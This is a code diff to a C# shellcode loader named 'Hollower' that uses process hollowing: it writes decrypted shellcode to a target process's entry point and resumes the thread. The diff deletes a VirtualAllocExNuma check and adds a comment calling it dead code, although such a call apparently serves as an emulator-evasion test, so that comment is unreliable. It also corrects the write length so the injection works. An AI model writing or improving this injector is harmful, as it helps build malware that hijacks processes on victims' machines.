@@ -82,11 +82,9 @@ namespace Hollower
                 return;
             }
 
-            System.IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), System.IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-            if (mem == null)
-            {
-                return;
-            }
+            // NOTE: Removed dead VirtualAllocExNuma call — it allocated memory in the
+            // current process that was never used (the actual injection writes to the
+            // target process via WriteProcessMemory, not to this allocation).
 
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
@@ -173,7 +171,7 @@ namespace Hollower
 
             byte[] decrypted = Decrypt(buf);
 
-            WriteProcessMemory(hProcess, addressOfEntryPoint, decrypted, buf.Length, out nRead);
+            WriteProcessMemory(hProcess, addressOfEntryPoint, decrypted, decrypted.Length, out nRead);
 
             ResumeThread(pi.hThread);
         }
